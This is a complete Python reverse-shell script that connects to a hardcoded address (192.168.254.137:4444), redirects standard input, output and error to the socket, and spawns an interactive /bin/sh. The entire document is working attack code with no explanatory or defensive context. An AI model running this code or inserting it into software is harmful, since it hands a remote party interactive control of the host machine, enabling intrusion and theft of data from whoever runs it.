import os
import subprocess
import socket

def reshell():
    ip = "192.168.254.137"
    port = "4444"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, int(port)))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])
if __name__ == "__main__":
    reshell()